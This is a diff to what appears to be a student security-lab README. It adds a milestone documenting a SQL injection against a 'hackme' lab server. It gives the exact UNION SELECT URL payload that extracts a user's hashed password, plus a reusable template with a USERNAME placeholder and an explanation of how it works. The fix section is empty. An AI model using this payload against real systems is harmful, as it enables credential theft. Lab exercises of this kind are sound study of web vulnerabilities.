@@ -62,3 +62,27 @@ I made a pseudo-server with a subdirectory called `xss\_server` in the `src` fol
 ## Fix on the server
 
 I used a simple input sanitization to strip out all html tags. Now the previous attack would not work, since the `<script>` tags were removed from the user input and all the statements will be displayed instead of being interpreted by javascript on the victim's browser.
+
+# MILESTONE 4
+
+## Malicious http request
+The exact request I used to leverage SQL injection attack: <http://secfarm-107/hackme/show.php?pid=1%27%20union%20select%20%2715%27,%20pass%20as%20message,%20%27b%27,%27c%27,%271543377553%27%20from%20users%20where%20username%20=%20%27user1%27;%23>
+
+Where the (hashed) password of user1 will be displayed after the POSTED BY.
+
+To reproduce a similar SQL injection attack, simply paste the following url into the browser, and substitute `USERNAME` in the url with the actual user name you want to steal password from.
+<http://secfarm-107/hackme/show.php?pid=1' union select '15', pass as message, 'b','c','1543377553' from users where username = 'USERNAME';%23>
+
+## How it works
+
+This attack takes advantage of the fact that the server does not check special characters in user inputs that are used to query results from the database.
+
+The `pid=1'` is combined with the previous part of the query, trying to find all posts with pid = 1, which returns an empty sets.
+
+However, that empty set is `union`ed with another query result from the `users` table, with the user's password displayed as the message in the query.
+
+The `%23` is a sharp symbol meant to comment out the last single quote in the server's php script.
+
+## Fix on the server
+
+
